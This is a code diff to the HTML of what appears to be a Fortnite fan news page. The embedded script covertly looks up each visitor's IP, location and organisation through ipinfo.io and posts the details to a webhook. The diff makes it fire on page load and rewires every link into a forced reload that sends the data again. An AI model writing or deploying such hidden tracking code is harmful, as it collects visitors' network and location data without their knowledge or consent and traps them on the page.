@@ -147,7 +147,7 @@
         © 2025 DC Fortnite News | Not affiliated with Epic Games or actual Fortnite skill
     </div>
 
-    <script>
+   <script>
   // Function to send IP info to webhook
   function sendVisitorInfo() {
     return fetch('https://ipinfo.io/json?token=9b88a4f00b132f')
@@ -175,22 +175,22 @@ Organization: ${data.org || 'N/A'}
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
         });
-      });
+      })
+      .catch(err => console.error('Error sending visitor info:', err));
   }
 
-  // Attach click listeners to all links
+  // Send visitor info when page loads
+  window.addEventListener('load', () => {
+    sendVisitorInfo();
+  });
+
+  // On link clicks, reload the page to trigger send again
   window.addEventListener('load', () => {
     const links = document.querySelectorAll('a');
     links.forEach(link => {
       link.addEventListener('click', function(event) {
         event.preventDefault(); // prevent immediate navigation
-        sendVisitorInfo()
-          .catch(err => console.error('Error sending visitor info:', err))
-          .finally(() => {
-            // After sending, reload the page
-            // You can also do link.href here if you want to navigate instead
-            location.reload();
-          });
+        location.reload();
       });
     });
   });
